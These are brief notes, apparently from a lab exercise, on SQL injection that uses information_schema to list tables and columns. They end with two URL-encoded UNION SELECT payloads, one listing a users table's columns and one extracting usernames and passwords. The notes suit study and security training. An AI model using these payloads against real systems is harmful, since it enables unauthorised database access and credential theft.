-- Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database. --

-- You can query information_schema.tables to list the tables in the database: --

SELECT * FROM information_schema.tables

--  You can then query information_schema.columns to list the columns in individual tables:

SELECT * FROM information_schema.columns WHERE table_name = 'Users'

--example--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_cgcmou'--



+UNION+SELECT+username_czxrcn,+password_iwdosh+FROM+users_cgcmou--
